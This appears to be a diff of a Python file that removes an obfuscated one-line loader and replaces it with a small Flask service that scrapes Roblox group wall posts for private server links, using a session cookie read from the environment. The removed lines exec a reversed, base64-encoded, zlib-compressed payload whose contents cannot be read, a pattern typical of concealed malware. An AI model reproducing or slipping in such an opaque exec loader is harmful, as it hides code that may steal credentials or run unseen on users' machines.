@@ -1,2 +1,110 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+from flask import Flask, jsonify, request
+import requests
+import re
+import os
+
+app = Flask(__name__)
+
+GROUP_ID = "35815907"
+API_URL = f"https://groups.roblox.com/v2/groups/{GROUP_ID}/wall/posts?sortOrder=Desc&limit=100&cursor="
+ROBLOX_COOKIE = os.getenv('ROBLOX_COOKIE', '')
+
+
+def get_headers():
+    return {
+        "cookie": ROBLOX_COOKIE,
+        "origin": "https://www.roblox.com",
+        "referer": "https://www.roblox.com/",
+        "sec-ch-ua": '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0"
+    }
+
+
+def fetch_group_wall_posts(cursor=""):
+    url = f"{API_URL}{cursor}" if cursor else API_URL
+    response = requests.get(url, headers=get_headers())
+    response.raise_for_status()
+    return response.json()
+
+
+def extract_server_links(posts_data):
+    server_link_pattern = r'https://www\.roblox\.com/share\?code=[a-f0-9]+&type=Server'
+    results = []
+    
+    if isinstance(posts_data, dict):
+        posts = posts_data.get('data', [])
+    else:
+        posts = posts_data
+    
+    for post in posts:
+        body = post.get('body', '')
+        timestamp = post.get('created', '')
+        found_links = re.findall(server_link_pattern, body, re.IGNORECASE)
+        
+        for link in found_links:
+            results.append({
+                "link": link,
+                "timestamp": timestamp
+            })
+    
+    return results
+
+
+def fetch_all_pages(max_pages=5):
+    cursor = ""
+    all_posts = []
+    page_count = 0
+    
+    while page_count < max_pages:
+        data = fetch_group_wall_posts(cursor)
+        
+        if data.get('data'):
+            all_posts.extend(data['data'])
+        
+        if not data.get('nextPageCursor'):
+            break
+        
+        cursor = data['nextPageCursor']
+        page_count += 1
+    
+    return all_posts
+
+
+@app.route('/links', methods=['GET'])
+def get_links():
+    try:
+        pages = request.args.get('pages', default=1, type=int)
+        
+        if pages <= 0:
+            return jsonify({"error": "Pages must be greater than 0"}), 400
+        
+        if pages == 1:
+            data = fetch_group_wall_posts()
+            links = extract_server_links(data)
+        else:
+            all_posts = fetch_all_pages(max_pages=pages)
+            links = extract_server_links(all_posts)
+        
+        return jsonify(links)
+    
+    except requests.exceptions.RequestException as e:
+        return jsonify({"error": f"Request failed: {str(e)}"}), 500
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({"status": "ok"})
+
+
+if __name__ == '__main__':
+    if not ROBLOX_COOKIE:
+        print("WARNING: ROBLOX_COOKIE environment variable is not set")
+    
+    app.run(host='0.0.0.0', port=5000, debug=False)
